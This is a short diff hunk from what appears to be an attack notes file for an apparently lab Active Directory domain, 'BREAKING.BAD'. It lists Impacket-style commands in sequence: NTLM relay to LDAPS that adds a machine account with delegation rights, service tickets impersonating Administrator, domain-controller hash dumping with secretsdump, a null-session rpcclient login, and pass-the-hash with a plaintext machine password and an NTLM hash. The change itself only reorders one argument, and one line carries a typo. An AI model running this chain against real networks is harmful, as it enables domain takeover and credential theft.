@@ -15,7 +15,7 @@ ntlmrelayx -t ldaps://DC01.BREAKING.BAD -smb2support --add-computer SHUTDOWN --d
 ntlmrelayx -t ldaps://DC01.BREAKING.BAD --remove-mic -smb2support --add-computer SHUTDOWN --delegate-access
 getST.py -spn host/DC02.BREAKING.BAD 'BREAKING.BAD/SHUTDOWN$:|=}<k*z},6r>rZ7' -impersonate Administrator -dc-ip 192.168.56.101
 getST.py -spn host/SV01.BREAKING.BAD 'BREAKING.BAD/SHUTDOWN$:|=}<k*z},6r>rZ7' -impersonate Administrator -dc-ip 192.168.56.101
-secretsdump -k -no-pass DC02.BREAKING.BAD -just-dc
+secretsdump -k -no-pass -just-dc DC02.BREAKING.BAD
 secretsdump -jus-dc hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@dc01.breaking.bad
 rpcclient -U "" -N DC01.BREAKING.BAD
 pth-net rpc group members "Domain admins" -U BREAKING.BAD/Administrator%ffffffffffffffffffffffffffffffff:a88baa3fdc8f581ee0fb05d7054d43e4 -S DC01.BREAKING.BAD
